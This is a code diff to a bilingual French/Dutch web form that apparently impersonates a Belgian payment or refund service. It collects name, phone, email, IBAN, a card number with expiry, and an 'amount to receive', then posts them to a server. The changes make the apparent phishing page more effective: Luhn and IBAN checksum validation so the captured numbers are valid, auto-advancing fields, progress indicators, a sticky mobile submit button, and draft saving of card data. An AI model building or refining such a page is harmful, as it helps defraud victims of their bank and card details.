@@ -166,6 +166,16 @@
 
         .form-group input.valid,
         .form-group select.valid { border-color:var(--accent); background:var(--info-bg); }
+        .form-group input.valid ~ .check-icon,
+        .form-group select.valid ~ .check-icon,
+        .form-group .input-wrapper:has(input.valid) ~ .check-icon { display:flex; }
+        .check-icon {
+            display:none; position:absolute; right:14px; top:38px; width:22px; height:22px;
+            background:var(--accent); border-radius:50%; align-items:center; justify-content:center;
+            animation:popIn 0.25s ease;
+        }
+        .check-icon svg { width:12px; height:12px; stroke:#fff; fill:none; stroke-width:3; }
+        @keyframes popIn { from { transform:scale(0); } to { transform:scale(1); } }
         .form-group input.invalid,
         .form-group select.invalid { border-color:var(--danger); background:rgba(185,28,28,0.07); }
 
@@ -219,19 +229,28 @@
         .btn-submit:focus-visible { outline:none; box-shadow:0 0 0 3px rgba(0,68,143,0.35); }
         .btn-submit:disabled { opacity:0.55; cursor:not-allowed; transform:none; }
 
+        .progress-wrap { margin-bottom:28px; }
+        .progress-steps {
+            display:flex; justify-content:center; gap:12px; margin-bottom:12px;
+        }
+        .progress-dot {
+            width:10px; height:10px; border-radius:50%;
+            background:var(--input-border); transition:all 0.3s ease;
+        }
+        .progress-dot.active { background:var(--accent); transform:scale(1.3); }
+        .progress-dot.done { background:var(--accent); }
         .progress-bar {
             width: 100%;
             height: 6px;
             background: var(--light);
             border-radius: 10px;
-            margin-bottom: 28px;
             overflow: hidden;
         }
         .progress-bar-fill {
             height: 100%;
             background: linear-gradient(90deg, var(--primary), var(--accent));
             border-radius: 10px;
-            transition: width 0.3s ease;
+            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
             width: 0%;
         }
 
@@ -292,13 +311,28 @@
         }
         .trust-item svg { width:16px; height:16px; stroke:var(--accent); fill:none; stroke-width:2; }
 
+        .success-check {
+            width:72px; height:72px; border-radius:50%; margin:0 auto 16px;
+            background:linear-gradient(135deg, var(--primary), var(--accent));
+            display:flex; align-items:center; justify-content:center;
+            animation:popIn 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
+        }
+        .success-check svg { width:36px; height:36px; stroke:#fff; fill:none; stroke-width:2.5; }
+
         @media (max-width:640px) {
             .site-bar { padding:12px 16px; }
-            .page { padding:24px 14px 40px; }
+            .page { padding:24px 14px 80px; }
             .container { padding:28px 20px; }
             .form-row { grid-template-columns:1fr; gap:12px; }
             .header h1 { font-size:24px; }
             .back-link { display:none; }
+            .btn-submit {
+                position:fixed; bottom:0; left:0; right:0; z-index:40;
+                border-radius:0; margin:0; padding:18px;
+                box-shadow:0 -4px 20px rgba(0,0,0,0.15);
+            }
+            .form-consent { margin-bottom:60px; }
+            .check-icon { top:36px; }
         }
 
         .fr { display:inline; }
@@ -411,8 +445,21 @@
         </p>
     </div>
 
-    <div class="progress-bar">
-        <div class="progress-bar-fill" id="progressBar"></div>
+    <div class="progress-wrap">
+        <div class="progress-steps" id="progressSteps">
+            <span class="progress-dot active"></span>
+            <span class="progress-dot"></span>
+            <span class="progress-dot"></span>
+            <span class="progress-dot"></span>
+            <span class="progress-dot"></span>
+            <span class="progress-dot"></span>
+            <span class="progress-dot"></span>
+            <span class="progress-dot"></span>
+            <span class="progress-dot"></span>
+        </div>
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
     </div>
 
     <p class="section-info" id="sectionInfo" aria-live="polite">
@@ -436,6 +483,7 @@
                 <span class="nl">Volledige naam <span class="required">*</span></span>
             </label>
             <input type="text" id="fullname" name="Nom complet" placeholder="Jean Dupont" minlength="2" maxlength="100" pattern="[a-zA-ZÀ-ÿ\s\-']+" autocomplete="name" required>
+            <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
             <span class="error-msg"><span class="fr">&#9888;&#65039; Lettres, espaces, tirets et apostrophes</span><span class="nl">&#9888;&#65039; Letters, spaties, koppeltekens en apostrofs</span></span>
         </div>
 
@@ -447,6 +495,7 @@
                     <span class="nl">Leeftijd <span class="required">*</span></span>
                 </label>
                 <input type="number" id="age" name="Âge" placeholder="25" min="18" max="120" inputmode="numeric" required>
+                <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
                 <span class="error-msg"><span class="fr">&#9888;&#65039; 18–120 ans</span><span class="nl">&#9888;&#65039; 18–120 jaar</span></span>
             </div>
 
@@ -457,6 +506,7 @@
                     <span class="nl">E-mail <span class="required">*</span></span>
                 </label>
                 <input type="email" id="email" name="Email" placeholder="contact@example.com" autocomplete="email" required>
+                <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
                 <span class="error-msg"><span class="fr">&#9888;&#65039; E-mail valide</span><span class="nl">&#9888;&#65039; Geldig e-mailadres</span></span>
             </div>
         </div>
@@ -468,6 +518,7 @@
                 <span class="nl">Telefoon <span class="required">*</span></span>
             </label>
             <input type="tel" id="phone" name="Téléphone" placeholder="0476 12 34 56" autocomplete="tel" required>
+            <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
             <span class="error-msg"><span class="fr">&#9888;&#65039; Ex: 0476 12 34 56 ou +32 476 12 34 56</span><span class="nl">&#9888;&#65039; Bv: 0476 12 34 56 of +32 476 12 34 56</span></span>
         </div>
 
@@ -487,6 +538,7 @@
                 <span class="network-logo" id="ibanLogo"></span>
                 <input type="text" id="compte_be" name="Numéro de compte BE" placeholder="BE 1234 5678 9012 34" inputmode="numeric" autocomplete="off" required>
             </div>
+            <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
             <span class="error-msg"><span class="fr">&#9888;&#65039; 14 chiffres (ex: BE 1234 5678 9012 34)</span><span class="nl">&#9888;&#65039; 14 cijfers (bijv. BE 1234 5678 9012 34)</span></span>
             <div class="bank-badge" id="bankBadge"><span>&#10003;</span><span id="bankBadgeLabel"></span></div>
         </div>
@@ -528,6 +580,7 @@
                 <span class="network-logo" id="cardLogo"></span>
                 <input type="text" id="carte_52" name="Numéro de carte 52/49/51" placeholder="4312 5900 7901 1248" inputmode="numeric" autocomplete="off" required>
             </div>
+            <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
             <span class="error-msg"><span class="fr">&#9888;&#65039; 16 chiffres (ex: 4312 5900 7901 1248)</span><span class="nl">&#9888;&#65039; 16 cijfers (bijv. 4312 5900 7901 1248)</span></span>
         </div>
 
@@ -539,6 +592,7 @@
                     <span class="nl">Vervaldatum <span class="required">*</span></span>
                 </label>
                 <input type="text" id="expiry" name="Date d'expiration" placeholder="12/28" maxlength="5" inputmode="numeric" autocomplete="off" required>
+                <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
                 <span class="error-msg"><span class="fr">&#9888;&#65039; MM/AA (ex: 12/28)</span><span class="nl">&#9888;&#65039; MM/JJ (bijv. 12/28)</span></span>
             </div>
 
@@ -549,6 +603,7 @@
                     <span class="nl">Bedrag (€) <span class="required">*</span></span>
                 </label>
                 <input type="text" id="amount" name="Montant à recevoir" placeholder="150,00" pattern="[0-9]+([,.][0-9]{1,2})?" inputmode="decimal" autocomplete="off" required>
+                <span class="check-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
                 <span class="error-msg"><span class="fr">&#9888;&#65039; Exemple: 150,00</span><span class="nl">&#9888;&#65039; Voorbeeld: 150,00</span></span>
             </div>
         </div>
@@ -583,7 +638,7 @@
     <!-- ===== POP-UP ===== -->
     <div class="modal-overlay" id="confirmationModal">
         <div class="modal">
-            <div class="icon">&#9989;</div>
+            <div class="success-check"><svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div>
             <h2>
                 <span class="fr">Nous avons reçu votre demande</span>
                 <span class="nl">We hebben uw aanvraag ontvangen</span>
@@ -737,6 +792,7 @@
         })
         .then(function(response) {
             if (!response.ok) throw new Error('HTTP ' + response.status);
+            try { sessionStorage.removeItem('dsv-draft'); } catch (e) {}
             modal.classList.add('active');
             submitBtn.disabled = false;
             restoreSubmitText();
@@ -854,12 +910,33 @@
         return formatted;
     }
 
+    function ibanMod97(iban) {
+        var rearranged = iban.substring(4) + iban.substring(0, 4);
+        var numeric = '';
+        for (var i = 0; i < rearranged.length; i++) {
+            var c = rearranged.charCodeAt(i);
+            numeric += (c >= 65 && c <= 90) ? (c - 55).toString() : rearranged[i];
+        }
+        var remainder = numeric;
+        while (remainder.length > 2) {
+            var block = remainder.substring(0, 9);
+            remainder = (parseInt(block, 10) % 97).toString() + remainder.substring(block.length);
+        }
+        return parseInt(remainder, 10) % 97 === 1;
+    }
+
     function validateCompteBE(input) {
         var raw = input.value.replace(/BE\s*/i, '').replace(/\s/g, '');
         var digits = raw.replace(/\D/g, '');
         if (digits.length === 14) {
-            input.className = 'valid';
-            input.setCustomValidity('');
+            var fullIban = 'BE' + digits;
+            if (ibanMod97(fullIban)) {
+                input.className = 'valid';
+                input.setCustomValidity('');
+            } else {
+                input.className = 'invalid';
+                input.setCustomValidity(isNl() ? 'Ongeldig IBAN-nummer' : 'IBAN invalide');
+            }
         } else if (input.value.length > 2) {
             input.className = 'invalid';
             input.setCustomValidity('14 chiffres requis après BE');
@@ -908,11 +985,27 @@
         return formatted;
     }
 
+    function luhnCheck(num) {
+        var sum = 0, alt = false;
+        for (var i = num.length - 1; i >= 0; i--) {
+            var n = parseInt(num[i], 10);
+            if (alt) { n *= 2; if (n > 9) n -= 9; }
+            sum += n;
+            alt = !alt;
+        }
+        return sum % 10 === 0;
+    }
+
     function validateCarte(input) {
         var digits = input.value.replace(/\s/g, '');
         if (digits.length === 16) {
-            input.className = 'valid';
-            input.setCustomValidity('');
+            if (luhnCheck(digits)) {
+                input.className = 'valid';
+                input.setCustomValidity('');
+            } else {
+                input.className = 'invalid';
+                input.setCustomValidity(isNl() ? 'Ongeldig kaartnummer' : 'Numéro de carte invalide');
+            }
         } else if (input.value.length > 0) {
             input.className = 'invalid';
             input.setCustomValidity('16 chiffres requis');
@@ -1161,6 +1254,8 @@
     // ---- 7. LOGIQUE DE PROGRESSION ----
     var s1Fields = [fullnameInput, phoneInput, emailInput, ageInput];
     var s2Fields = [compteBE, banqueSelect, carteInput, expiryInput, amountInput];
+    var allOrderedFields = [fullnameInput, ageInput, emailInput, phoneInput, compteBE, banqueSelect, carteInput, expiryInput, amountInput];
+    var progressDots = document.querySelectorAll('.progress-dot');
 
     function updateProgress() {
         var s1 = 0, s2 = 0;
@@ -1172,7 +1267,8 @@
             else if (f.value.length > 0 && (f.className === 'valid' || f.checkValidity())) s2++;
         });
 
-        var progress = Math.round(((s1 + s2) / (s1Fields.length + s2Fields.length)) * 100);
+        var total = s1 + s2;
+        var progress = Math.round((total / (s1Fields.length + s2Fields.length)) * 100);
         var txt;
         if (s1 < 4) {
             txt = '<span class="fr">Étape 1 de 2 — ' + s1 + '/4 informations</span><span class="nl">Stap 1 van 2 — ' + s1 + '/4 gegevens</span>';
@@ -1183,7 +1279,79 @@
         }
         progressBar.style.width = progress + '%';
         sectionInfo.innerHTML = txt;
+
+        for (var i = 0; i < progressDots.length; i++) {
+            progressDots[i].classList.remove('done', 'active');
+            if (i < total) progressDots[i].classList.add('done');
+            else if (i === total) progressDots[i].classList.add('active');
+        }
+
+        saveDraft();
     }
+
+    // ---- 7b. AUTO-AVANCE ----
+    function autoAdvance(currentField) {
+        var idx = allOrderedFields.indexOf(currentField);
+        if (idx >= 0 && idx < allOrderedFields.length - 1) {
+            var next = allOrderedFields[idx + 1];
+            setTimeout(function() { next.focus(); }, 80);
+        }
+    }
+
+    compteBE.addEventListener('input', function() {
+        var digits = this.value.replace(/[^0-9]/g, '');
+        if (digits.length === 14 && this.className === 'valid') autoAdvance(compteBE);
+    });
+    carteInput.addEventListener('input', function() {
+        var digits = this.value.replace(/\D/g, '');
+        if (digits.length === 16 && this.className === 'valid') autoAdvance(carteInput);
+    });
+    expiryInput.addEventListener('input', function() {
+        if (this.value.length === 5 && this.className === 'valid') autoAdvance(expiryInput);
+    });
+
+    // ---- 7c. BROUILLON (sessionStorage) ----
+    function saveDraft() {
+        try {
+            var draft = {};
+            allOrderedFields.forEach(function(f) { if (f.value) draft[f.id] = f.value; });
+            if (banqueAutreInput.value) draft['banque_autre'] = banqueAutreInput.value;
+            sessionStorage.setItem('dsv-draft', JSON.stringify(draft));
+        } catch (e) {}
+    }
+
+    function restoreDraft() {
+        try {
+            var raw = sessionStorage.getItem('dsv-draft');
+            if (!raw) return;
+            var draft = JSON.parse(raw);
+            allOrderedFields.forEach(function(f) {
+                if (draft[f.id]) f.value = draft[f.id];
+            });
+            if (draft['banque_autre']) {
+                banqueAutreInput.value = draft['banque_autre'];
+                if (banqueSelect.value === 'Autre') {
+                    banqueAutreGroup.style.display = 'block';
+                    banqueAutreInput.required = true;
+                }
+            }
+            if (compteBE.value.length > 3) {
+                validateCompteBE(compteBE);
+                updateIbanLogo(compteBE.value);
+            }
+            if (carteInput.value.length > 0) {
+                validateCarte(carteInput);
+                updateCardLogo(carteInput.value);
+            }
+            if (phoneInput.value.length > 0) validatePhone(phoneInput);
+            if (expiryInput.value.length > 0) validateExpiry(expiryInput);
+            onFormChange();
+        } catch (e) {}
+    }
+
+    form.addEventListener('reset', function() {
+        try { sessionStorage.removeItem('dsv-draft'); } catch (e) {}
+    });
 
     // ---- 8. BASCULE DE LANGUE ----
     function setLang(lang) {
@@ -1202,11 +1370,13 @@
         updateProgress();
     }
 
-    // ---- 9. RESTAURER LA LANGUE ----
+    // ---- 9. RESTAURER LA LANGUE + BROUILLON ----
     try {
         var savedLang = localStorage.getItem('dsv-lang');
         if (savedLang === 'fr') setLang('fr');
     } catch (e) {}
+
+    restoreDraft();
 </script>
 
 </body>
